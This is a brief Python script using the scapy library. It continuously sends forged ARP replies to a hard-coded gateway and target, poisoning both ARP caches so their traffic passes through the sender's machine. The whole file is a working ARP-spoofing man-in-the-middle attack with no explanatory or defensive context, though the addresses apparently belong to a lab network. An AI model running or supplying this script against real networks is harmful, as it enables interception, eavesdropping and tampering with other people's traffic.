from scapy.all import *

gateway_ip = '198.13.13.1'
target_ip = '198.13.0.14'
gateway_mac = '02:42:58:04:bd:86'
target_mac = '02:42:c6:0d:00:0e'
my_ip = '198.13.0.15'
my_mac = '7E:4F:D9:EA:96:46'

while (True):
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=my_ip, hwsrc=my_mac))
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=my_ip, hwsrc=my_mac))
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
    time.sleep(4)
